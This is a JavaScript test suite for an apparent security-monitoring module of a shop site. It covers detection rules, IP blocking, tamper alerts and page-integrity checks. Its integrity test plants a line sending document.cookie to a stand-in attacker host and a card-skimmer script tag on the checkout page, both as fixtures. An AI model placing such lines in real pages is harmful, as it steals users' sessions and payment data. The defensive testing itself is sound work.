import { test, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { fakeD1, fakeKV } from './fakes.mjs';
import { runSoc } from '../templates/sentinel/src/soc/run.js';
import { blockIp, expireBlocks, undoAction, closeIncident } from '../templates/sentinel/src/soc/respond.js';
import { inventory, skeleton } from '../templates/sentinel/src/soc/integrity.js';
import { iso, H, MIN, DAY } from '../templates/sentinel/src/soc/util.js';
import { secLog } from '../templates/site/functions/api/_seclog.js';

const T0 = Date.parse('2026-02-02T05:00:00Z');    // 05:00 UTC: after the 03:30 summary slot
let world, sent, cfCalls;

function site() {
  return {
    '/': '<html><head><script src="/app.js?v=1"></script><script>window.cfg={nonce:"abc123",n:42}</script></head></html>',
    '/checkout': '<html><script src="/app.js?v=1"></script><script src="https://checkout.example-payments.com/v1.js"></script></html>',
    '/app.js': 'console.log("app v1")',
  };
}

beforeEach(() => {
  sent = []; cfCalls = [];
  world = {
    pages: site(), deploy: 'dep1', adminStatus: 401,
    tokens: [{ id: 't1', name: 'ci-deploy', status: 'active' }],
    members: [{ user: { email: 'owner@example.com', two_factor_authentication_enabled: true } }],
    dns: [{ type: 'A', name: 'example.com', content: '192.0.2.1', proxied: true }],
    settings: [{ id: 'ssl', value: 'strict' }, { id: 'min_tls_version', value: '1.2' }],
    bucketPublic: false, audit: [],
  };
  globalThis.fetch = async (url, o = {}) => {
    const u = new URL(String(url));
    const method = o.method || 'GET';
    if (u.hostname === 'api.cloudflare.com') {
      const p = u.pathname.replace('/client/v4', '');
      cfCalls.push(method + ' ' + p);
      const ok = (result) => Response.json({ success: true, result });
      if (p === '/accounts/acc/tokens') return ok(world.tokens);
      if (p === '/accounts/acc/members') return ok(world.members);
      if (p === '/zones' && u.searchParams.get('name')) return ok([{ id: 'z1', name: u.searchParams.get('name') }]);
      if (p === '/zones/z1/dns_records') return ok(world.dns);
      if (p === '/zones/z1/settings') return ok(world.settings);
      if (p === '/accounts/acc/r2/buckets/backups/domains/managed') return ok({ enabled: world.bucketPublic, domain: 'pub-x.r2.dev' });
      if (p === '/accounts/acc/r2/buckets/backups/domains/custom') return ok({ domains: [] });
      if (p === '/accounts/acc/audit_logs') return ok(world.audit);
      if (p === '/accounts/acc/pages/projects/my-shop/deployments') return ok([{ id: world.deploy }]);
      if (p === '/zones/z1/firewall/access_rules/rules' && method === 'POST') return ok({ id: 'rule-' + cfCalls.length });
      if (p.startsWith('/zones/z1/firewall/access_rules/rules/') && method === 'DELETE') return ok({});
      return Response.json({ success: false, errors: [{ message: 'unmocked ' + p }] }, { status: 404 });
    }
    if (u.hostname === 'example.com') {
      if (u.pathname.startsWith('/api/admin')) return new Response('{}', { status: world.adminStatus });
      const body = world.pages[u.pathname];
      if (body != null) return new Response(body, { status: 200 });
      return new Response('<!doctype html><html><body>app</body></html>', { status: 200 });   // SPA fallback
    }
    if (u.hostname === 'discord.example') { sent.push(JSON.parse(o.body).content); return new Response('ok'); }
    return new Response('nope', { status: 404 });
  };
});

function setup() {
  const DB = fakeD1();
  DB.exec(`CREATE TABLE admin_sessions (id TEXT); INSERT INTO admin_sessions VALUES ('s1'), ('s2');
    CREATE TABLE admin_users (username TEXT, role TEXT); INSERT INTO admin_users VALUES ('owner', 'owner');
    CREATE TABLE admin_devices (token TEXT, name TEXT);
    CREATE TABLE coupons (code TEXT, percent INTEGER, active INTEGER); INSERT INTO coupons VALUES ('WELCOME10', 10, 1);
    CREATE TABLE products (sku TEXT, price INTEGER); INSERT INTO products VALUES ('A1', 50000), ('B2', 80000);
    CREATE TABLE orders (id TEXT, total INTEGER, status TEXT, created_at TEXT);
    CREATE TABLE users (id INTEGER); INSERT INTO users VALUES (1), (2), (3);`);
  return { DB, STATE: fakeKV(), CF_TOKEN: 'cf', CF_ACCOUNT: 'acc', DISCORD_WEBHOOK: 'https://discord.example/h' };
}
const ev = (env, kind, now, o = {}) => secLog({ env, now }, kind, { actor: o.actor, meta: o.meta, where: { ip: o.ip || '198.51.100.7', country: o.country || 'IN', asnOrg: o.asn || 'Home Broadband Ltd', ua: o.ua || 'Mozilla/5.0 (Linux; Android 14) Chrome/131', path: o.path || '/api/admin/orders' } });
const run = (env, now, force = {}) => runSoc(env, { now, force });
const cases = async (env) => (await env.DB.prepare('SELECT rule, subject, sev, hits FROM soc_incidents ORDER BY id').all()).results;
async function learned(env) { await ev(env, 'admin_ok', T0 - DAY, { actor: 'owner' }); await run(env, T0); sent = []; }

// ---------------------------------------------------------------- learning + detect

test('first run only learns: nothing that already existed rings', async () => {
  const env = setup();
  await ev(env, 'attack', T0 - H, { path: '/api/login', country: 'NL', asn: 'Example Hosting BV' });
  const r = await run(env, T0);
  assert.equal(r.learning, true);
  assert.equal(sent.length, 0);
  assert.equal((await cases(env)).length, 0);
});

test('honeytoken: CRITICAL case, no 2nd message when already paged, everyone signed out, abroad IP blocked', async () => {
  const env = setup(); await learned(env);
  await ev(env, 'honeytoken:admin-key', T0 + MIN, { country: 'NL', asn: 'Example Hosting BV', ip: '203.0.113.9', meta: { paged: true } });
  await run(env, T0 + 5 * MIN);
  const c = await cases(env);
  assert.equal(c[0].rule, 'honeytoken'); assert.equal(c[0].sev, 'CRITICAL');
  assert.equal(sent.length, 0, 'site already paged this hit');
  assert.equal(await env.DB.prepare('SELECT COUNT(*) n FROM admin_sessions').first('n'), 0);
  assert.ok(cfCalls.includes('POST /zones/z1/firewall/access_rules/rules'));
  const actions = (await env.DB.prepare('SELECT action FROM soc_actions').all()).results.map((a) => a.action);
  assert.deepEqual(actions.sort(), ['block_ip', 'sign_out_all']);
});

test('key guessed: success after 5 wrong tries from a new network → HIGH, sign-out, block', async () => {
  const env = setup(); await learned(env);
  for (let i = 0; i < 5; i++) await ev(env, 'admin_fail', T0 + i * 1000, { ip: '203.0.113.' + (10 + i), country: 'NL', asn: 'Example Hosting BV' });
  await ev(env, 'admin_ok', T0 + 10_000, { ip: '203.0.113.50', country: 'NL', asn: 'Example Hosting BV', actor: 'owner' });
  await run(env, T0 + 5 * MIN);
  assert.ok((await cases(env)).some((c) => c.rule === 'key_guessed' && c.sev === 'HIGH'));
  assert.match(sent[0], /\[HIGH\] Admin key worked after 5 wrong tries/);
  assert.match(sent[0], /What to do:/);
  assert.equal(await env.DB.prepare('SELECT COUNT(*) n FROM admin_sessions').first('n'), 0);
});

test('new home network in a browser = summary note; same from a script = HIGH', async () => {
  const env = setup(); await learned(env);
  await ev(env, 'admin_ok', T0 + MIN, { ip: '100.64.1.1', actor: 'owner' });
  await run(env, T0 + 5 * MIN);
  assert.equal(sent.length, 0);
  await ev(env, 'admin_ok', T0 + 6 * MIN, { ip: '100.80.1.1', ua: 'python-requests/2.31' });
  await run(env, T0 + 10 * MIN);
  assert.match(sent[0], /Admin used by a script from a new network/);
});

test('home-country residential attacker is never auto-blocked; self-test traffic ignored', async () => {
  const env = setup(); await learned(env);
  await run(env, T0 + MIN, { selftest: true });                     // the daily self-test runs at T0+1min
  await ev(env, 'attack', T0 + 2 * MIN, { path: '/api/login', meta: { pattern: 'sqli' } });
  // the self-test's own request: its UA, from the Cloudflare Workers network, inside its window
  await ev(env, 'probe', T0 + 2 * MIN, { path: '/.env', ip: '2a06:98c0:3600::103', country: 'US', asn: 'Cloudflare', ua: 'SOC-SelfTest/1.0', meta: { status: 200 } });
  await run(env, T0 + 5 * MIN);
  const c = await cases(env);
  assert.equal(c.length, 1);
  assert.equal(c[0].rule, 'attack_sensitive');
  assert.equal(await env.DB.prepare('SELECT COUNT(*) n FROM soc_blocks').first('n'), 0, 'home residential: never auto-blocked');
});

test('a spoofed self-test User-Agent does NOT hide an attacker', async () => {
  const env = setup(); await learned(env);
  await run(env, T0 + MIN, { selftest: true });
  // same UA, but from a hosting network (not the Workers range)
  await ev(env, 'attack', T0 + 2 * MIN, { path: '/api/login', ip: '203.0.113.77', country: 'NL', asn: 'Example Hosting BV', ua: 'SOC-SelfTest/1.0' });
  // Workers range and the right UA, but hours after the self-test window
  await ev(env, 'probe', T0 + 3 * H, { path: '/.env', ip: '2a06:98c0:3600::103', country: 'US', asn: 'Cloudflare', ua: 'SOC-SelfTest/1.0', meta: { status: 200 } });
  await run(env, T0 + 3 * H + 5 * MIN);
  const rules = (await cases(env)).map((c) => c.rule).sort();
  assert.deepEqual(rules, ['attack_sensitive', 'probe_succeeded']);
  assert.equal(await env.DB.prepare("SELECT COUNT(*) n FROM soc_blocks WHERE ip = '203.0.113.77'").first('n'), 1, 'spoofer on a hosting network is blocked');
});

test('cooldown: a repeat counts on the case, does not ring again', async () => {
  const env = setup(); await learned(env);
  await ev(env, 'attack', T0 + MIN, { path: '/api/orders', ip: '203.0.113.5', country: 'NL', asn: 'Hetzner Online' });
  await run(env, T0 + 5 * MIN);
  await ev(env, 'attack', T0 + 6 * MIN, { path: '/api/orders', ip: '203.0.113.5', country: 'NL', asn: 'Hetzner Online' });
  await run(env, T0 + 10 * MIN);
  assert.equal(sent.filter((s) => /Injection attempt/.test(s)).length, 1);
  assert.equal((await cases(env))[0].hits, 2);
});

test('OTP pumping from one address → HIGH + block; brute force → MEDIUM', async () => {
  const env = setup(); await learned(env);
  for (let i = 0; i < 10; i++) await ev(env, 'otp_sent', T0 + i * 1000, { ip: '203.0.113.20', country: 'US', asn: 'Example Mobile', path: '/api/login/code' });
  for (let i = 0; i < 20; i++) await ev(env, 'admin_fail', T0 + i * 1000, { ip: '203.0.113.21', country: 'DE', asn: 'Contabo GmbH' });
  await run(env, T0 + 5 * MIN);
  const c = await cases(env);
  assert.ok(c.some((x) => x.rule === 'otp_abuse' && x.sev === 'HIGH'));
  assert.ok(c.some((x) => x.rule === 'brute_force' && x.sev === 'MEDIUM'));
  assert.equal(await env.DB.prepare("SELECT COUNT(*) n FROM soc_blocks WHERE status = 'active'").first('n'), 2);
});

test('underpriced order is held before the courier', async () => {
  const env = setup(); await learned(env);
  await env.DB.prepare("INSERT INTO orders VALUES ('ORD-1', 1, 'pending', ?)").bind(iso(T0 + MIN)).run();
  await run(env, T0 + 5 * MIN);
  assert.equal(await env.DB.prepare("SELECT status FROM orders WHERE id = 'ORD-1'").first('status'), 'on_hold');
});

// ---------------------------------------------------------------- tamper

test('tamper: new coupon, deleted users, price crash ring; quiet otherwise', async () => {
  const env = setup(); await learned(env);
  await run(env, T0 + 5 * MIN);
  assert.equal(sent.length, 0);
  env.DB.exec("INSERT INTO coupons VALUES ('FREE100', 100, 1); DELETE FROM users WHERE id = 3; UPDATE products SET price = 100 WHERE sku = 'A1';");
  await run(env, T0 + 10 * MIN);
  const rules = (await cases(env)).map((c) => c.rule).sort();
  assert.deepEqual(rules, ['price_drop', 'rows_deleted', 'tamper']);
});

// ---------------------------------------------------------------- posture + who

test('posture: stranger token → HIGH with who; own token doing its job → note; new member CRITICAL; public bucket CRITICAL', async () => {
  const env = setup(); await learned(env);
  world.tokens.push({ id: 't2', name: 'mystery', status: 'active' });
  world.audit = [{ id: 'a1', actor: { email: 'intruder@bad.example' }, action: { type: 'create' }, resource: { type: 'api_token' }, when: '2026-02-02T05:50:00Z' }];
  world.members.push({ user: { email: 'intruder@bad.example', two_factor_authentication_enabled: false } });
  world.bucketPublic = true;
  await run(env, T0 + H);
  const c = await cases(env);
  assert.ok(c.some((x) => x.rule === 'cf_token_added' && x.sev === 'HIGH'));
  assert.ok(c.some((x) => x.rule === 'cf_member_added' && x.sev === 'CRITICAL'));
  assert.ok(c.some((x) => x.rule === 'backups_public' && x.sev === 'CRITICAL'));
  assert.ok(sent.some((s) => /Who: intruder@bad\.example/.test(s)));

  sent = [];
  world.dns.push({ type: 'TXT', name: 'example.com', content: 'verify=1', proxied: false });
  world.audit = [{ id: 'a2', actor: { email: 'owner@example.com' }, action: { type: 'create' }, resource: { type: 'dns_record' }, when: '2026-02-02T06:50:00Z' }];
  world.bucketPublic = false;
  await run(env, T0 + 2 * H);
  assert.equal(sent.filter((s) => /DNS records changed/.test(s)).length, 0, 'own DNS change = summary only');
});

// ---------------------------------------------------------------- integrity

test('integrity: new outside script on the payment page = CRITICAL; own script changed without deploy = HIGH; with deploy = note', async () => {
  const env = setup(); await learned(env);
  world.pages['/checkout'] += '<script src="https://evil-cdn.example/skim.js"></script>';
  await run(env, T0 + H);
  assert.ok(sent.some((s) => /\[CRITICAL\] Payment page loads a script from a new host/.test(s)));

  sent = [];
  world.pages['/app.js'] = 'console.log("app v1"); fetch("https://evil.example/c?d="+document.cookie)';
  await run(env, T0 + 2 * H);
  assert.ok(sent.some((s) => /Your scripts changed with no new deploy/.test(s)));

  sent = [];
  world.pages['/app.js'] = 'console.log("app v2")'; world.deploy = 'dep2';
  await run(env, T0 + 3 * H);
  assert.equal(sent.filter((s) => /scripts changed/i.test(s)).length, 0);
});

test('integrity: inline values (nonce, numbers) are not a change; new code is', async () => {
  assert.equal(skeleton('window.cfg={nonce:"abc",n:1}'), skeleton('window.cfg={nonce:"xyz",n:99}'));
  assert.notEqual(skeleton('window.cfg={n:1}'), skeleton('window.cfg={n:1};steal()'));
  const inv = await inventory('<script type="application/ld+json">{"a":1}</script><script src="https://cdn.x/a.js"></script>', 'https://example.com/', async () => '');
  assert.deepEqual(inv.hosts, ['cdn.x']);
  assert.equal(inv.inline.length, 0, 'JSON-LD data blocks are skipped');
});

// ---------------------------------------------------------------- self-test

test('self-test: admin API answering 200 = HIGH; SPA fallback 200 for /.env is not a leak', async () => {
  const env = setup(); await learned(env);
  await run(env, T0 + DAY);
  assert.equal(sent.filter((s) => /protection stopped working/.test(s)).length, 0);
  world.adminStatus = 200;
  await run(env, T0 + 2 * DAY + MIN);
  assert.ok(sent.some((s) => /protection stopped working[\s\S]*admin API without key/.test(s)));
});

// ---------------------------------------------------------------- blocks, undo, rules, summary

test('blocks escalate 24 h → 7 days, expire off Cloudflare, can be undone; allow-list wins', async () => {
  const env = setup(); await learned(env);
  const a = await blockIp(env, env.DB, { ip: '203.0.113.40', reason: 't', country: 'NL', asnOrg: 'x' }, T0);
  assert.equal(a.hours, 24);
  await expireBlocks(env, env.DB, T0 + 25 * H);
  assert.ok(cfCalls.some((c) => c.startsWith('DELETE /zones/z1/firewall/access_rules/rules/')));
  const b = await blockIp(env, env.DB, { ip: '203.0.113.40', reason: 't', country: 'NL', asnOrg: 'x' }, T0 + 26 * H);
  assert.equal(b.hours, 24 * 7);
  const act = await env.DB.prepare("SELECT id FROM soc_actions WHERE action = 'block_ip' ORDER BY id DESC").first('id');
  assert.equal((await undoAction(env, env.DB, act, 'owner', T0 + 27 * H)).ok, true);
  assert.equal(await env.DB.prepare("SELECT COUNT(*) n FROM soc_blocks WHERE status = 'active'").first('n'), 0);
  await env.DB.prepare("INSERT INTO soc_allow (value) VALUES ('203.0.113.')").run();
  assert.match((await blockIp(env, env.DB, { ip: '203.0.113.41', country: 'NL' }, T0 + 28 * H)).skipped, /never-block/);
});

test('rules: SOC_RULES can switch a rule off, but never a locked one', async () => {
  const env = { ...setup(), SOC_RULES: JSON.stringify({ attack_sensitive: { off: true }, honeytoken: { off: true } }) };
  await learned(env);
  await ev(env, 'attack', T0 + MIN, { path: '/api/login' });
  await ev(env, 'honeytoken:phone', T0 + MIN, { path: '/api/track' });
  await run(env, T0 + 5 * MIN);
  const rules = (await cases(env)).map((c) => c.rule);
  assert.deepEqual(rules, ['honeytoken']);
  assert.ok(sent.some((s) => /CRITICAL/.test(s)));
});

test('daily summary: notes + counts once a day, then reset; cases can be closed', async () => {
  const env = setup(); await learned(env);
  await ev(env, 'admin_ok', T0 + MIN, { ip: '100.64.9.9', actor: 'owner' });
  await run(env, T0 + 5 * MIN);
  await run(env, T0 + DAY, {});
  const summaries = sent.filter((s) => /Daily security summary/.test(s));
  assert.equal(summaries.length, 1);
  assert.match(summaries[0], /Admin from a new home network/);
  await ev(env, 'tfa_off', T0 + DAY + MIN, { actor: 'staff1' });
  await run(env, T0 + DAY + 5 * MIN);
  const id = await env.DB.prepare("SELECT id FROM soc_incidents WHERE rule = 'tfa_off'").first('id');
  assert.equal(await closeIncident(env.DB, id, 'mine'), true);
});
